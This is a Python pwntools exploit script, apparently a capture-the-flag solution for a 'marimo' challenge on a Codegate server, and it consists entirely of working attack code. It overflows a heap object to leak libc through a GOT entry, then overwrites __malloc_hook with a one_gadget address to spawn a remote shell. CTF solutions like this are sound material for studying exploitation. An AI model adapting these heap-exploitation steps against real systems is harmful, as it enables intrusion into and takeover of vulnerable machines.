#!/usr/bin/env python
from pwn import *


# But_every_cat_is_more_cute_than_Marimo

e , l = ELF( './marimo' ) , ELF( './libc6_2.23-0ubuntu10_amd64.so' )

host  , port = 'ch41l3ng3s.codegate.kr' , 3333
y = remote( host , port )


def sho( name , profile ):
    y.sendlineafter( '>> ' , 'show me the marimo' )
    y.sendlineafter( '>> ' , name )
    y.sendlineafter( '>> ' , profile )

def buy( size ):
    y.sendlineafter( '>> ' , 'B' )
    y.sendlineafter( '>> ' , str( size ) )

def view( idx ):
    y.sendlineafter( '>> ' , 'V' )
    y.sendlineafter( '>> ' , str( idx ) )

def mod( data ):
    y.sendlineafter( '>> ' , 'M' )
    y.sendlineafter( '>> ' , data )

def bac():
    y.sendlineafter( '>> ' , 'B' )


for _ in xrange( 0x10 ):
    sho( 'a' * 0x10 , 'b' * 0x20 )

view( 0 )
mod( 'Y' * 0x38 + p64( e.got['__libc_start_main'] ) )
bac()

view( 1 )
y.recvuntil( 'name : ' )
l.address = u64( y.recv(6).ljust( 8 , '\x00' ) ) - l.symbols['__libc_start_main']
log.success( 'libc -> %s' % hex( l.address ) )
bac()

view( 0 )
mod( 'Y' * 0x38 + p64( e.got['__libc_start_main'] ) + p64( l.symbols['__malloc_hook'] ) )
bac()

one = 0xf02a4
view( 1 )
mod( p64( l.address + one ) )
bac()

y.sendlineafter( '>> ' , 'show me the marimo' )


y.interactive()